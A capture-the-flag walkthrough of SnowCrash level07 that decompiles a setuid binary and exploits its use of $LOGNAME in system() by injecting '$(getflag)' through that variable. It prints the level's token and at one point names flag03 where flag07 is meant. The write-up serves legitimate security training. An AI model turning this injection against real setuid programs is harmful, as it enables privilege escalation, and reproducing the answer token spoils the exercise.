# Level07

## Walkthrough

We check if there are some files in the home directory.

```bash
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
level07@SnowCrash:~$ file level07 
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
```

Again, another script owned by **flag07** with the **setuid** bit flag. We import it with **SCP**.

```bash
host:~$ scp -P 4242 level07@localhost:level07 level07
```

We decompile the executable thanks to **dogbolt**.

[Link to the decompiled output](https://dogbolt.org/?id=c0805f22-ef97-46b0-83aa-91f95bdac7f7)

We check the `main()` function and figure out that the program:
- calls `getegid()` and `geteuid()` to retrieve the effective group ID and user ID
- sets them with `setresgid()` and `setresuid()` (in our case: **flag03**)
- gets a pointer to the value of the `$LOGNAME` environment variable
- uses it in a call to `asprintf()` in order to combine it with the `echo` command
- executes the result in a `system()` call

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v3; // eax
  char *v5; // [esp+14h] [ebp-Ch] BYREF
  __gid_t v6; // [esp+18h] [ebp-8h]
  __uid_t v7; // [esp+1Ch] [ebp-4h]

  v6 = getegid();
  v7 = geteuid();
  setresgid(v6, v6, v6);
  setresuid(v7, v7, v7);
  v5 = 0;
  v3 = getenv("LOGNAME");
  asprintf(&v5, "/bin/echo %s ", v3);
  return system(v5);
}
```

The logic is quite symple: we have to write a command substitution into the `$LOGNAME` environment variable, which is gonna be executed during the `system()` call.  
If we don't do this, the `getflag` command will be run as **level07** instead of **flag07**.

```bash
level07@SnowCrash:~$ LOGNAME='$(getflag)'
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## Resources

- [Command substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html)
